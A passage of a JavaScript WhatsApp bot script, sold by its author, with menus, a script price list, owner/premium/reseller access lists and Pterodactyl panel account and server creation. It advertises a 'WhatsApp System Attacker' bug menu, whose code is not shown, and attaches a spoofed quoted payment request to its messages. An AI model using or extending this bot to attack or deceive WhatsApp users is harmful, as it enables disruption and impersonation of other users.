\`│\` *開発者* : 𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃
\`│\` *リプト* : 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐁𝐮𝐲
\`│\` *バジョン* : ${isCreator ? "𝐎𝐰𝐧𝐞𝐫 𝐔𝐬𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫" : "𝐍𝐨𝐭 𝐀𝐜𝐜𝐞𝐬"}
\`╰────────────────㋡︎\`

\`╭─[ 𝐎͢𝐰͠𝐧͡𝐞͢𝐫 𝐌͠𝐞͡𝐧͢𝐮 ]\`
\`│\` ▢ ${prefix}addpremium
\`│\` ▢ ${prefix}delpremium
\`│\` ▢ ${prefix}listpremium
\`│\` ▢ ${prefix}addowner
\`│\` ▢ ${prefix}delowner
\`│\` ▢ ${prefix}listowner
\`│\` ▢ ${prefix}addreseler
\`│\` ▢ ${prefix}delreseler
\`│\` ▢ ${prefix}listreseler
\`│\` ▢ ${prefix}listadmin
\`│\` ▢ ${prefix}listpanel
\`│\` ▢ ${prefix}delpanel
\`│\` ▢ ${prefix}tagall
\`│\` ▢ ${prefix}hidetag
\`│\` ▢ ${prefix}promote
\`│\` ▢ ${prefix}demote
\`│\` ▢ ${prefix}idgc
\`│\` ▢ ${prefix}listgc
\`│\` ▢ ${prefix}antilinkgc
\`│\` ▢ ${prefix}swgc
\`│\` ▢ ${prefix}kick
\`│\` ▢ ${prefix}jpm
\`│\` ▢ ${prefix}jpmht
\`│\` ▢ ${prefix}addbl
\`│\` ▢ ${prefix}delbl
\`│\` ▢ ${prefix}self
\`│\` ▢ ${prefix}public
\`╰────❍\`
`;

                await aruloffcx.sendMessage(m.chat, {
                    interactiveMessage: {
                        title: menu,
                        footer: '',
                        thumbnail: "https://files.catbox.moe/sfbwxk.jpeg",
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                                },
                                {
                                    name: 'single_select',
                                    buttonParamsJson: JSON.stringify({
                                        title: "𝐌𝚵𝐍𝐔",
                                        sections: [
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Bug - Menu(Node-SFX)',
                                                        title: '',
                                                        description: '- Displaying the WhatsApp System Attacker Menu',
                                                        id: '.bugmenu'
                                                    }
                                                ]
                                            },
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Owner - Menu(Node-Js)',
                                                        title: '',
                                                        description: '- Add bot access and settings',
                                                        id: '.ownermenu'
                                                    }
                                                ]
                                            },
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Other - Menu(JavaScript-Core)',
                                                        title: '',
                                                        description: '- Other Features and Menu Panel',
                                                        id: '.othermenu'
                                                    }
                                                ]
                                            }
                                        ]
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
                                    })
                                }
                            ]
                        }
                    }
                },
                    {
                        quoted: {
                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "USD",
                                    amount1000: "999999999",
                                    requestFrom: "0@s.whatsapp.net",
                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
                                    expiryTimestamp: "999999999",
                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
                                }
                            }
                        }
                    });
                break;
            }

            case 'othermenu': {
                await reaction(m.chat, "😈")
                await sleep(550);
                await reaction(m.chat, "☠️")
                await sleep(550);
                await reaction(m.chat, "🦠")
                await sleep(550);
                await reaction(m.chat, "🩸")
                await sleep(550);
                await reaction(m.chat, "🔖")

                let timestamp = speed();
                let latensi = speed() - timestamp;
                const menu = `\`╭─[ 𝐈͢𝐍͠𝐅͡𝚯𝐑͢𝐌͠𝐀͡𝐓͢𝐈͠𝚯𝐍 𝐁͢𝚯͠𝐓 ]\`
\`│\` *リト名* : 𝐄𝐥𝐦𝐢𝐧𝐚𝐭𝐨𝐫 𝐈𝐧𝐯𝐢𝐜𝐭𝐮𝐬
\`│\` *リプ* : 𝟖.𝟎
\`│\` *スクプ* : ${aruloffcx.public ? '𝐏𝐮𝐛𝐥𝐢𝐜 𝐁𝐨𝐭' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐁𝐨𝐭'}
\`│\` *開発者* : 𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃
\`│\` *リプト* : 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐁𝐮𝐲
\`│\` *バジョン* : ${isCreator ? "𝐎𝐰𝐧𝐞𝐫 𝐔𝐬𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫" : "𝐍𝐨𝐭 𝐀𝐜𝐜𝐞𝐬"}
\`╰────────────────㋡︎\`

\`╭─[ 𝐎͢𝐭͠𝐡͡𝐞͢𝐫 𝐌͠𝐞͡𝐧͢𝐮 ]\`
\`│\` ▢ ${prefix}brat
\`│\` ▢ ${prefix}iqc
\`│\` ▢ ${prefix}rvo
\`│\` ▢ ${prefix}play
\`│\` ▢ ${prefix}tourl
\`│\` ▢ ${prefix}tiktok
\`│\` ▢ ${prefix}trackip
\`│\` ▢ ${prefix}reactch
\`│\` ▢ ${prefix}kapan
\`│\` ▢ ${prefix}cekganteng
\`│\` ▢ ${prefix}ceksange
\`│\` ▢ ${prefix}ceklesbi
\`│\` ▢ ${prefix}cekidch
\`│\` ▢ ${prefix}cekkhodam
\`│\` ▢ ${prefix}hentaineko
\`╰────❍\`

\`╭─[ 𝐏͢𝐚͠𝐧͡𝐞͢𝐥 𝐌͠𝐞͡𝐧͢𝐮 ]\`
\`│\` ▢ ${prefix}1gb username
\`│\` ▢ ${prefix}2gb username
\`│\` ▢ ${prefix}3gb username
\`│\` ▢ ${prefix}4gb username
\`│\` ▢ ${prefix}5gb username
\`│\` ▢ ${prefix}6gb username
\`│\` ▢ ${prefix}7gb username
\`│\` ▢ ${prefix}8gb username
\`│\` ▢ ${prefix}9gb username
\`│\` ▢ ${prefix}10 username
\`│\` ▢ ${prefix}unli username
\`│\` ▢ ${prefix}cadmin username
\`╰────❍\`
`;

                await aruloffcx.sendMessage(m.chat, {
                    interactiveMessage: {
                        title: menu,
                        footer: '',
                        thumbnail: "https://files.catbox.moe/sfbwxk.jpeg",
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                                },
                                {
                                    name: 'single_select',
                                    buttonParamsJson: JSON.stringify({
                                        title: "𝐌𝚵𝐍𝐔",
                                        sections: [
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Bug - Menu(Node-SFX)',
                                                        title: '',
                                                        description: '- Displaying the WhatsApp System Attacker Menu',
                                                        id: '.bugmenu'
                                                    }
                                                ]
                                            },
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Owner - Menu(Node-Js)',
                                                        title: '',
                                                        description: '- Add bot access and settings',
                                                        id: '.ownermenu'
                                                    }
                                                ]
                                            },
                                            {
                                                title: '⚝ 么尺ㄩㄥ',
                                                highlight_label: '⌜ ㅊ - Ⲁ͢Ⲣ͡ⲩⲖ͜ Ⲟ͢ⲫ͡ⲫⲓ͜ⲕⲓⲁⲖ-Ⲓ͢Ⲇ͡ 🕊️ ⌟',
                                                rows: [
                                                    {
                                                        header: 'Other - Menu(JavaScript-Core)',
                                                        title: '',
                                                        description: '- Other Features and Menu Panel',
                                                        id: '.othermenu'
                                                    }
                                                ]
                                            }
                                        ]
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭",
                                        url: "https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M"
                                    })
                                }
                            ]
                        }
                    }
                },
                    {
                        quoted: {
                            key: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ownername", participant: "0@s.whatsapp.net" },
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "USD",
                                    amount1000: "999999999",
                                    requestFrom: "0@s.whatsapp.net",
                                    noteMessage: { extendedTextMessage: { text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃" } },
                                    expiryTimestamp: "999999999",
                                    amount: { value: "91929291929", offset: "1000", currencyCode: "INR" }
                                }
                            }
                        }
                    });
                break;
            }

            case "buysc": {

                await reaction(m.chat, "😈");
                await sleep(550);
                await reaction(m.chat, "☠️");
                await sleep(550);
                await reaction(m.chat, "🦠");
                await sleep(550);
                await reaction(m.chat, "🩸");
                await sleep(550);
                await reaction(m.chat, "🔖");

                let imgsc = await prepareWAMessageMedia(
                    { image: fs.readFileSync("./gudang/image/aruloffc 𖣂  ¿?.jpg") },
                    { upload: aruloffcx.waUploadToServer }
                );

                const msgii = await generateWAMessageFromContent(m.chat, {
                    ephemeralMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.fromObject({
                                    text: `𝖲𝖢𝖱𝖨𝖯𝖳 𝖭𝖮 𝖴𝖯: 𝟣𝟧.𝟢𝟢𝟢
𝖲𝖢𝖱𝖨𝖯𝖳 𝖥𝖱𝖤𝖤 𝖴𝖯: 𝟤𝟢.𝟢𝟢𝟢

𝖱𝖤𝖲𝖤𝖫𝖤𝖱: 𝟤𝟧.𝟢𝟢𝟢
𝖯𝖠𝖳𝖭𝖤𝖱: 𝟥𝟢.𝟢𝟢𝟢
𝖮𝖶𝖭𝖤𝖱: 𝟦𝟢.𝟢𝟢𝟢
𝖳𝖠𝖭𝖦𝖠𝖭 𝖪𝖠𝖭𝖠𝖭: 𝟧𝟢.𝟢𝟢𝟢
𝖬𝖮𝖣𝖤𝖱𝖠𝖳𝖮𝖱: 𝟩𝟢.𝟢𝟢𝟢`,
                                }),
                                contextInfo: {},
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards: [{
                                        header: proto.Message.InteractiveMessage.Header.fromObject({
                                            title: `𝖬𝖠𝖴 𝖮𝖱𝖣𝖤𝖱? 𝖢𝖧𝖠𝖳 𝖣𝖤𝖵𝖤𝖫𝖮𝖯𝖤𝖱 𝖬𝖤𝖫𝖠𝖫𝖴𝖨 𝖶𝖧𝖠𝖳𝖲𝖠𝖯𝖯 𝖠𝖳𝖠𝖴 𝖳𝖤𝖫𝖤𝖦𝖱𝖠𝖬`,
                                            hasMediaAttachment: true,
                                            ...imgsc
                                        }),
                                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                            buttons: [
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩","url":"https://wa.me/6285814233961","merchant_url":"https://www.google.com"}`
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦","url":"https://t.me/arulofficialll","merchant_url":"https://www.google.com"}`
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"𝐈𝐧𝐟𝐨 𝐔𝐩𝐝𝐚𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭","url":"https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M","merchant_url":"https://www.google.com"}`
                                                }
                                            ]
                                        })
                                    }]
                                })
                            })
                        }
                    }
                }, {
                    quoted: {
                        key: {
                            remoteJid: "0@s.whatsapp.net",
                            fromMe: false,
                            id: "ownername",
                            participant: "0@s.whatsapp.net"
                        },
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "USD",
                                amount1000: "999999999",
                                requestFrom: "0@s.whatsapp.net",
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: "𝐀͢𝐫͡𝐮𝐥 ᳟𝐎͢𝐟͡𝐟𝐢𝐜𝐢𝐚𝐥-᳟𝐈͢𝐃"
                                    }
                                },
                                expiryTimestamp: "999999999",
                                amount: {
                                    value: "91929291929",
                                    offset: "1000",
                                    currencyCode: "INR"
                                }
                            }
                        }
                    }
                });

                await aruloffcx.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
                break;
            }

            // CASE ADD OWNER
            case 'addowner': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (m.quoted || text) {
                    let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted ? m.quoted.sender : '';
                    if (creator.includes(orang)) return zreply(`*Gagal Menambah Owner!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *Owner*`);
                    creator.push(orang);
                    fs.writeFileSync('./gudang/database/owner.json', JSON.stringify(creator, null, 2));
                    zreply(`*berhasil menambahkan ke daftar owner*`);
                } else {
                    zreply(`— example: ${prefix + command} 62xxx`);
                }
                break;
            }

            // CASE DEL OWNER
            case 'delowner':
            case 'delown': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (m.quoted || text) {
                    if (text == 'all') {
                        fs.writeFileSync('./gudang/database/owner.json', '[]');
                        return zreply(`*berhasil menghapus akses owner`);
                    }
                    let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted ? m.quoted.sender : '';

                    let pos = creator.indexOf(orang);
                    if (pos === -1) return zreply(`User tidak ditemukan dalam database owner`);

                    creator.splice(pos, 1);
                    fs.writeFileSync('./gudang/database/owner.json', JSON.stringify(creator, null, 2));
                    zreply(`*berhasil menghapus akses owner*`);
                } else {
                    zreply(`— example: ${prefix + command} 62xxx`);
                }
                break;
            }

            // CASE LIST OWNER
            case 'listowner': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                let teks = '*DAFTAR OWNER BOT:*\n\n';
                for (let i = 0; i < creator.length; i++) {
                    teks += `${i + 1}. ${creator[i].split('@')[0]}\n`;
                }
                zreply(teks);
                break;
            }

            case 'addprem':
            case "addpremium": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                if (!args[0]) return zreply(`— example: ${prefix + command} 62xxx`);

                const phoneNumber = q.split("|")[0].replace(/[^0-9]/g, '');
                if (phoneNumber.length < 10) return zreply(`Nomor Tidak Valid`);

                const anj = phoneNumber + `@s.whatsapp.net`;
                let ceknya;

                try {
                    ceknya = await aruloffcx.onWhatsApp(anj);
                } catch (error) {
                    return zreply(`Error checking WhatsApp number`);
                }

                if (!ceknya || ceknya.length == 0) return zreply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp`);

                premium.push(anj);
                fs.writeFileSync("./gudang/database/premium.json", JSON.stringify(premium));
                zreply(`*berhasil menambahkan akses premium*`);
                break;
            }

            case 'delprem':
            case 'delpremium': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                if (args.length < 1) return zreply(`— example: ${prefix + command} 62xxx`);

                if (m.mentionedJid && m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        const index = getpremiumPosition(m.mentionedJid[i], premium);
                        if (index !== -1) {
                            premium.splice(index, 1);
                        }
                    }
                    fs.writeFileSync("./gudang/database/premium.json", JSON.stringify(premium));
                    zreply(`*berhasil menghapus akses premium*`);
                } else {
                    const phoneNumber = args[0].replace(/[^0-9]/g, '');
                    const targetJid = phoneNumber + "@s.whatsapp.net";
                    const index = getpremiumPosition(targetJid, premium);

                    if (index !== -1) {
                        premium.splice(index, 1);
                        fs.writeFileSync("./gudang/database/premium.json", JSON.stringify(premium));
                        zreply(`*berhasil menghapus akses premium*`);
                    } else {
                        zreply(`User tidak ditemukan dalam database premium`);
                    }
                }
                break;
            }

            // CASE LIST PREMIUM
            case 'listprem':
            case 'listpremium': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                let teks = '*DAFTAR USER PREMIUM:*\n\n';
                for (let i = 0; i < premium.length; i++) {
                    teks += `${i + 1}. ${premium[i].split('@')[0]}\n`;
                }
                zreply(teks);
                break;
            }

            // RESELER
            case 'addseler':
            case 'addres':
            case "addreseler": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!args[0]) return zreply(`— example: ${prefix + command} 62xxx`);

                const phoneNumber = q.split("|")[0].replace(/[^0-9]/g, '');
                if (phoneNumber.length < 10) return zreply(`Nomor Tidak Valid`);

                const anj = phoneNumber + `@s.whatsapp.net`;
                let ceknya;

                try {
                    ceknya = await aruloffcx.onWhatsApp(anj);
                } catch (error) {
                    return zreply(`Error checking WhatsApp number`);
                }

                if (!ceknya || ceknya.length == 0) return zreply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp`);

                reseler.push(anj);
                fs.writeFileSync("./gudang/database/reseler.json", JSON.stringify(reseler));
                zreply(`*berhasil menambahkan akses reseler*`);
                break;
            }

            // CASE DELETE RES
            case 'delseler':
            case 'delres':
            case 'delreseler': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (args.length < 1) return zreply(`— example: ${prefix + command} 62xxx`);

                if (m.mentionedJid && m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        const index = getpremiumPosition(m.mentionedJid[i], reseler);
                        if (index !== -1) {
                            reseler.splice(index, 1);
                        }
                    }
                    fs.writeFileSync("./gudang/database/reseler.json", JSON.stringify(reseler));
                    zreply(`*berhasil menghapus akses reseler*`);
                } else {
                    const phoneNumber = args[0].replace(/[^0-9]/g, '');
                    const targetJid = phoneNumber + "@s.whatsapp.net";
                    const index = getpremiumPosition(targetJid, reseler);

                    if (index !== -1) {
                        reseler.splice(index, 1);
                        fs.writeFileSync("./gudang/database/reseler.json", JSON.stringify(reseler));
                        zreply(`*berhasil menghapus akses reseler*`);
                    } else {
                        zreply(`User tidak ditemukan dalam database reseler`);
                    }
                }
                break;
            }

            // CASE LIST RES
            case 'listseler':
            case 'listres':
            case 'listreseler': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                let teks = '*DAFTAR RESELER PANEL:*\n\n';
                for (let i = 0; i < reseler.length; i++) {
                    teks += `${i + 1}. ${reseler[i].split('@')[0]}\n`;
                }
                zreply(teks);
                break;
            }

            case "self": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                aruloffcx.public = false;
                zreply(`*this is specifically for private chat*`);
                break;
            }

            case "public": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                aruloffcx.public = true;
                zreply(`*this is specifically for public chat*`);
                break;
            }

            case "cadmin": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!text) return zreply(`— example: ${prefix + command} ArulOfficial-ID`);

                // Tambahkan konfigurasi panel
                const domain = config.panel?.domain || global.domain;
                const apikey = config.panel?.apikey || global.apikey;

                if (!domain || !apikey) {
                    return zreply("Panel configuration not found");
                }

                let username = text.toLowerCase();
                let email = username + "@gmail.com";
                let name = args[0].charAt(0).toUpperCase() + args[0].slice(1).toLowerCase();
                let password = username + crypto.randomBytes(2).toString('hex');

                try {
                    let f = await fetch(domain + "/api/application/users", {
                        "method": "POST",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        },
                        "body": JSON.stringify({
                            "email": email,
                            "username": username.toLowerCase(),
                            "first_name": name,
                            "last_name": "Admin",
                            "root_admin": true,
                            "language": "en",
                            "password": password.toString()
                        })
                    });
                    let data = await f.json();
                    if (data.errors) return zreply(JSON.stringify(data.errors[0], null, 2));
                    let user = data.attributes;

                    var orang;
                    if (m.isGroup) {
                        orang = m.sender;
                        await zreply("*Berhasil membuat admin panel*\nData akun sudah di kirim ke private chat");
                    } else {
                        orang = m.chat;
                    }

                    var teks = `🔐 *Sukses Admin Panel Created*
▸ Name: ${user.first_name}
▸ Email: ${email}
▸ ID: ${user.id}

🌐 *Domain Panel*
▸ Username: ${user.username}
▸ Password: ${password.toString()}
▸ Login: ${domain}

⚠️ *Rules Panel*
▸ Dilarang rusuh
▸ Dilarang ddos server
▸ Dilarang otak atik server
▸ Dilarang rusuh panel orang
▸ Dilarang intip panel orang
▸ Dilarang maling script
▸ Ketahuan maling script gw del adp lu
▸ Garansi aktif 3 hari
▸ Expired Server 15 hari
▸ Wajib sensor domain saat ss
▸ Simpan data akun dengan baik
▸ Data akun hilang? bukan tanggung jawab seller
▸ Buat panel seperlunya aja, jangan asal buat
`;
                    await aruloffcx.sendMessage(orang, { text: teks }, { quoted: qchannel });
                } catch (error) {
                    console.error('Cadmin error:', error);
                    zreply('Gagal membuat admin panel');
                }
                break;
            }

            case "1gb":
            case "2gb":
            case "3gb":
            case "4gb":
            case "5gb":
            case "6gb":
            case "7gb":
            case "8gb":
            case "9gb":
            case "10gb":
            case "unlimited":
            case "unli": {
                if (!isCreator && !isReseler) return zreply(`*no, this is for reselers only*`);
                if (!text) return zreply(`— example: ${prefix + command} ArulOfficial-ID`);

                // Tambahkan konfigurasi panel
                const domain = config.panel?.domain || global.domain;
                const apikey = config.panel?.apikey || global.apikey;
                const nestid = config.panel?.nestid || global.nestid;
                const egg = config.panel?.egg || global.egg;
                const loc = config.panel?.loc || global.loc;

                if (!domain || !apikey || !nestid || !egg || !loc) {
                    return zreply("Panel configuration not found");
                }

                global.panel = text;
                var ram, disknya, cpu;

                switch (command) {
                    case "1gb": ram = "1000"; disknya = "1000"; cpu = "30"; break;
                    case "2gb": ram = "2000"; disknya = "1000"; cpu = "50"; break;
                    case "3gb": ram = "3000"; disknya = "2000"; cpu = "50"; break;
                    case "4gb": ram = "4000"; disknya = "2000"; cpu = "70"; break;
                    case "5gb": ram = "5000"; disknya = "3000"; cpu = "90"; break;
                    case "6gb": ram = "6000"; disknya = "3000"; cpu = "110"; break;
                    case "7gb": ram = "7000"; disknya = "4000"; cpu = "125"; break;
                    case "8gb": ram = "8000"; disknya = "4000"; cpu = "150"; break;
                    case "9gb": ram = "9000"; disknya = "5000"; cpu = "180"; break;
                    case "10gb": ram = "10000"; disknya = "5000"; cpu = "190"; break;
                    case "unlimited":
                    case "unli": ram = "0"; disknya = "0"; cpu = "0"; break;
                }

                let username = global.panel.toLowerCase();
                let email = username + "@gmail.com";
                let name = (username) + " Server";
                let password = username + crypto.randomBytes(2).toString('hex');

                try {
                    let f = await fetch(domain + "/api/application/users", {
                        "method": "POST",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        },
                        "body": JSON.stringify({
                            "email": email,
                            "username": username.toLowerCase(),
                            "first_name": name,
                            "last_name": "Server",
                            "language": "en",
                            "password": password.toString()
                        })
                    });
                    let data = await f.json();
                    if (data.errors) return zreply(JSON.stringify(data.errors[0], null, 2));
                    let user = data.attributes;

                    let desc = new Date().toLocaleString();
                    let usr_id = user.id;

                    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        }
                    });
                    let data2 = await f1.json();
                    let startup_cmd = data2.attributes.startup;

                    let f2 = await fetch(domain + "/api/application/servers", {
                        "method": "POST",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey,
                        },
                        "body": JSON.stringify({
                            "name": name,
                            "description": "Created By Arul Official-ID",
                            "user": usr_id,
                            "egg": parseInt(egg),
                            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_20",
                            "startup": startup_cmd,
                            "environment": {
                                "INST": "npm",
                                "USER_UPLOAD": "0",
                                "AUTO_UPDATE": "0",
                                "CMD_RUN": "npm start"
                            },
                            "limits": {
                                "memory": parseInt(ram),
                                "swap": 0,
                                "disk": parseInt(disknya),
                                "io": 500,
                                "cpu": parseInt(cpu)
                            },
                            "feature_limits": {
                                "databases": 5,
                                "backups": 5,
                                "allocations": 5
                            },
                            "deploy": {
                                "locations": [parseInt(loc)],
                                "dedicated_ip": false,
                                "port_range": [],
                            },
                        })
                    });
                    let result = await f2.json();
                    if (result.errors) return zreply(JSON.stringify(result.errors[0], null, 2));
                    let server = result.attributes;

                    var orang;
                    if (m.isGroup) {
                        orang = m.sender;
                        await zreply("*Berhasil membuat panel*\nData akun sudah dikirim ke privat chat");
                    } else {
                        orang = m.chat;
                    }

                    var teks = `🔐 *Sukses Panel Created*
▸ Name: ${name}
▸ Email: ${email}
▸ ID: ${server.id}

🌐 *Domain Panel*
▸ Username: ${user.username}
▸ Password: ${password}
▸ Login: ${domain}

⚠️ *Rules Panel*
▸ Dilarang rusuh
▸ Dilarang ddos
▸ Garansi 3 hari
▸ Expired Server 15 hari
▸ Wajib sensor domain saat ss
▸ Simpan data akun dengan baik
▸ Data akun hilang? bukan tanggung jawab seller
`;
                    await aruloffcx.sendMessage(orang, { text: teks }, { quoted: qchannel });
                    delete global.panel;
                } catch (error) {
                    console.error('Panel creation error:', error);
                    zreply('Gagal membuat panel');
                }
                break;
            }

            case "listadmin": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                const domain = config.panel?.domain || global.domain;
                const apikey = config.panel?.apikey || global.apikey;

                if (!domain || !apikey) {
                    return zreply("Panel configuration not found");
                }

                try {
                    let cek = await fetch(domain + "/api/application/users?page=1", {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        }
                    });
                    let res2 = await cek.json();
                    let users = res2.data;
                    if (users.length < 1) return zreply("Tidak ada admin panel");

                    var teks = "\n *乂 List admin panel pterodactyl*\n";
                    await users.forEach((i) => {
                        if (i.attributes.root_admin !== true) return;
                        teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`;
                    });
                    await aruloffcx.sendMessage(m.chat, { text: teks }, { quoted: qchannel });
                } catch (error) {
                    console.error('List admin error:', error);
                    zreply('Gagal mengambil data admin');
                }
                break;
            }

            case "listpanel":
            case "listserver": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                const domain = config.panel?.domain || global.domain;
                const apikey = config.panel?.apikey || global.apikey;
                const capikey = config.panel?.capikey || global.capikey;

                if (!domain || !apikey || !capikey) {
                    return zreply("Panel configuration not found");
                }

                try {
                    let f = await fetch(domain + "/api/application/servers?page=1", {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        }
                    });
                    let res = await f.json();
                    let servers = res.data;
                    if (servers.length < 1) return zreply("Tidak Ada Server Bot");

                    let messageText = "\n *乂 List server panel pterodactyl*\n";
                    for (let server of servers) {
                        let s = server.attributes;
                        let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
                            "method": "GET",
                            "headers": {
                                "Accept": "application/json",
                                "Content-Type": "application/json",
                                "Authorization": "Bearer " + capikey
                            }
                        });
                        let data = await f3.json();
                        let status = data.attributes ? data.attributes.current_state : s.status;
                        messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
